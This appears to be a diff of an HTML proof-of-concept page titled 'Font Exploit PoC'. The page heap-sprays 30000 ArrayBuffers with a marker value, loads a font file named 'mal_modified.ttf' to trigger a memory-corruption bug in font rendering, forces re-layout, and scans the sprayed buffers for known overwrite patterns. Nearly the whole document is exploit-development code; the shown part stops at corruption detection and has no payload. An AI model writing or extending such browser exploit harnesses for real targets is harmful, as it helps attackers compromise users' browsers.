@@ -2,12 +2,21 @@
 <html>
 <head>
   <meta charset="utf-8" />
-  <title>Heap Spray + Glyph Test</title>
+  <title>Font Exploit PoC</title>
   <style>
     body {
       background: #000;
       color: #0f0;
       font-family: monospace;
+      padding: 2em;
+    }
+    h1 {
+      color: lime;
+    }
+    #glyph {
+      font-size: 100px;
+      color: red;
+      margin-top: 1em;
     }
     .log {
       white-space: pre-wrap;
@@ -15,11 +24,13 @@
       background: #111;
       padding: 1em;
       border: 1px solid #0f0;
+      height: 300px;
+      overflow-y: scroll;
     }
   </style>
 </head>
 <body>
-  <h1>Heap Spray + Glyph Test</h1>
+  <h1>Font Exploit PoC</h1>
   <div id="glyph">%</div>
   <button onclick="start()">Start</button>
   <div class="log" id="log">Waiting...</div>
@@ -32,13 +43,13 @@
     let spray = [];
 
     function heap_spray() {
-      log("[*] Heap spraying ArrayBuffer(0x1000) x 10000...");
-      for (let i = 0; i < 10000; i++) {
-        let ab = new ArrayBuffer(0x1000);
+      log("[*] Heap spraying ArrayBuffer(0x200) x 30000...");
+      for (let i = 0; i < 30000; i++) {
+        let ab = new ArrayBuffer(0x200);
         let dv = new DataView(ab);
-        // Initialize with known pattern
-        for (let j = 0; j < 0x1000; j += 4) {
-          dv.setUint32(j, 0xdeadbeef, true);  // Known value
+        // Fill with known pattern
+        for (let j = 0; j < 0x200; j += 4) {
+          dv.setUint32(j, 0xdeadbeef, true);  // Pattern to detect corruption
         }
         spray.push(dv);
       }
@@ -46,20 +57,30 @@
     }
 
     async function start() {
+      log("[*] Starting exploit...");
+
       heap_spray();
+
+      log("[*] Forcing layout...");
+      document.getElementById('glyph').offsetHeight; // Force layout flush
 
       log("[*] Loading malicious font...");
       const font_face = new FontFace('foo', 'url("mal_modified.ttf")');
 
       try {
         await font_face.load();
+        log("[+] Font loaded.");
         document.fonts.add(font_face);
         document.getElementById('glyph').style.fontFamily = 'foo';
-        log("[+] Font loaded and applied.");
+        log("[+] Font applied. Rendering glyph...");
       } catch (err) {
         log("[-] Error loading font:", err);
         return;
       }
+
+      // Force re-render
+      document.getElementById('glyph').innerText = '%';
+      document.getElementById('glyph').offsetHeight;
 
       log("[*] Scanning for corruption...");
       detect_corruption();
@@ -69,12 +90,12 @@
       for (let i = 0; i < spray.length; i++) {
         try {
           let val = spray[i].getUint32(0, true);
-          if (val !== 0xdeadbeef) {
-            log(`[!] Corruption detected at index ${i}: 0x${val.toString(16)}`);
+          if (val === 0x41414141 || val === 0x11223344 || val === 0x55555555) {
+            log(`[!] Matched overwrite pattern at index ${i}: 0x${val.toString(16)}`);
+          } else if (val !== 0xdeadbeef) {
+            log(`[?] Unknown value at index ${i}: 0x${val.toString(16)}`);
           }
-        } catch (e) {
-          // Skip unreadable regions
-        }
+        } catch (e) {}
       }
       log("[*] Scan complete.");
     }
